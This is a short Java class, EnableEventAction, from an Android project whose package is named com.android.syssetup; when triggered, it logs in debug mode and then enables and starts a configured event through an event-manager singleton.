package com.android.syssetup.action;

import com.android.syssetup.Trigger;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfAction;
import com.android.syssetup.manager.ManagerEvent;
import com.android.syssetup.util.Check;

public class EnableEventAction extends EventAction {
	private static final String TAG = "EnableEventAction";

	public EnableEventAction(ConfAction params) {
		super(params);
	}

	@Override
	public boolean execute(Trigger trigger) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + eventId);//$NON-NLS-1$
		}
		
		final ManagerEvent eventManager = ManagerEvent.self();

		eventManager.enable(eventId);
		eventManager.start(eventId);
		
		return true;
	}

}
